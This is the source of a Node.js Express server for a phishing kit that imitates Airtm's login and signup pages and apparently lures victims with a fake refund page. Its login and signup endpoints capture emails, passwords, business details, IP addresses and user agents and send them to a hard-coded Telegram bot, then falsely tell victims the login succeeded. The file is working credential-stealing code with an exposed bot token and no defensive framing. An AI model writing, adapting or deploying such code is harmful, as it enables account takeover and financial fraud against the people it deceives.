const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// TELEGRAM CONFIGURATION - YOUR CREDENTIALS
// ============================================
const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
const TELEGRAM_CHAT_ID = '7386607055';

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// TELEGRAM SEND MESSAGE FUNCTION
// ============================================
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        throw error;
    }
}

// ============================================
// FORMAT LOGIN DATA
// ============================================
function formatLoginData(email, password, req) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toLocaleString('en-US', { 
        timeZone: 'Africa/Lagos',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `
🔐 <b>AIRTM LOGIN ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}

🕐 <b>Time:</b> ${timestamp}
📍 <b>IP Address:</b> ${ip}
💻 <b>User Agent:</b> ${userAgent}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Unauthorized access attempt detected!</i>
    `;
}

// ============================================
// FORMAT SIGNUP DATA
// ============================================
function formatSignupData(data, req) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toLocaleString('en-US', { 
        timeZone: 'Africa/Lagos',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `
📝 <b>AIRTM SIGNUP ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${data.email}
🔑 <b>Password:</b> ${data.password}

🌍 <b>Country:</b> ${data.country}
🏢 <b>Business Name:</b> ${data.businessName}
📋 <b>Entity Type:</b> ${data.entityType}
✅ <b>Terms Accepted:</b> ${data.termsAccepted ? 'Yes' : 'No'}

🕐 <b>Time:</b> ${timestamp}
📍 <b>IP Address:</b> ${ip}
💻 <b>User Agent:</b> ${userAgent}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Unauthorized access attempt detected!</i>
    `;
}

// ============================================
// ROUTES
// ============================================

// Serve login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve signup page
app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'signup.html'));
});

// Serve refund page
app.get('/refund', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'refund.html'));
});

// ============================================
// LOGIN ENDPOINT
// ============================================
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Email and password are required' 
            });
        }

        const message = formatLoginData(email, password, req);
        await sendTelegramMessage(message);

        console.log(`✅ Login attempt recorded: ${email}`);

        res.json({ 
            success: true, 
            message: 'Login successful! Redirecting...',
            redirect: '/refund'
        });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error. Please try again.' 
        });
    }
});

// ============================================
// SIGNUP ENDPOINT
// ============================================
app.post('/api/signup', async (req, res) => {
    try {
        const { 
            email, 
            password, 
            confirmPassword, 
            country, 
            businessName, 
            entityType,
            termsAccepted 
        } = req.body;

        if (!email || !password || !confirmPassword || !country || !businessName || !entityType) {
            return res.status(400).json({ 
                success: false, 
                message: 'All fields are required' 
            });
        }

        if (password !== confirmPassword) {
            return res.status(400).json({ 
                success: false, 
                message: 'Passwords do not match' 
            });
        }

        if (!termsAccepted) {
            return res.status(400).json({ 
                success: false, 
                message: 'You must accept the Terms of Service' 
            });
        }

        const signupData = { email, password, country, businessName, entityType, termsAccepted };
        const message = formatSignupData(signupData, req);
        await sendTelegramMessage(message);

        console.log(`✅ Signup attempt recorded: ${email}`);

        res.json({ 
            success: true, 
            message: 'Account created successfully! Redirecting...',
            redirect: '/refund'
        });

    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error. Please try again.' 
        });
    }
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 http://localhost:${PORT}`);
    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
});
